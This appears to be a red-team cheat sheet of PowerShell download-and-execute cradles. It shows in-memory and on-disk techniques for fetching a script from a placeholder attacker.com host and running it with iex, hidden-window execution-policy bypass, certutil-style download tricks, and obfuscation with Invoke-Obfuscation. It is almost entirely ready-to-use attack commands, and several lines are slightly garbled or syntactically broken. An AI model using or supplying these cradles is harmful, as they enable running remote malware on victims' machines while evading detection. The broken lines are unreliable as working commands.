## Prerequisite
* `-ExecutionPolicy bypass -Window hidden`
## Download and Execution
#### In-Memory
* `iex (New-Object Net.WebCLient).DownloadString('<remote_file>')` - downloads and executes the remote file
* `iex (New-Object Net.WebClient).DownloadData()`
* `iex (New-Object Net.WebClient).OpenRead()`
* `iex (New-Object Net.HttpWebRequest) - Certutil.exe -ping`
* __Net.WebRequest__
  * `$req=[System.Net.WebRequest]::Create("<http://attacker.com/game.ps1>")`
  * `$res=$req.GetResponse()`
  * `iex ([SYstem.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()`
* __System.Xml.XmlDocument__
  * `$xmldoc = New-Object System.Xml.XmlDocument`
  * `$xmldoc.Load("<remote_xml_file>")`
  * `iex $xmldoc.command.a.execute` - download and executes malicious PowerShell located inside XML document
* __Msxml2.XMLHTTP__
  * `$downloader = New-Object  -ComObject Msxml2.XMLHTTP`
  * `$downloader.open("GET","http://attacker.com/game.ps1",$false)`
  * `$downloader.send()`
  * `iex $downloader.responseText`
* __WinHttp.WinHttpRequest.5.1__
  * same as __Msxml2.XMLHTTP__

#### On-Disk
* __DownloadFile__
  * `$local_file="<C:\programdata\payload.exe>"` 
  * `New-Object Net.WebClient).DownloadFile($payload,$local_file)`
  * `& $local_file`
* `BTSAdmin.exe`
* `iex (New-Object Net.HttpWebRequest) - Certutil.exe -urlcache`
* `Invoke-WebRequest -Uri <target> -OutFile <filename>` - download file from target

#### Tools
* https://github.com/danielbohannon/Invoke-CradleCrafter

## Obfuscation
#### Tools
* https://github.com/danielbohannon/Invoke-Obfuscation
  * `$env:PSModulePath` - get modules path; copy downlaoded modules to this location
  * `Import_module Invoke-Obfuscation`
  * `Invoke-Obfuscation`
    * `Set SCRIPTBLOCK iex (New-Object Net.WebCLient).DownloadString('<remote_file>')`
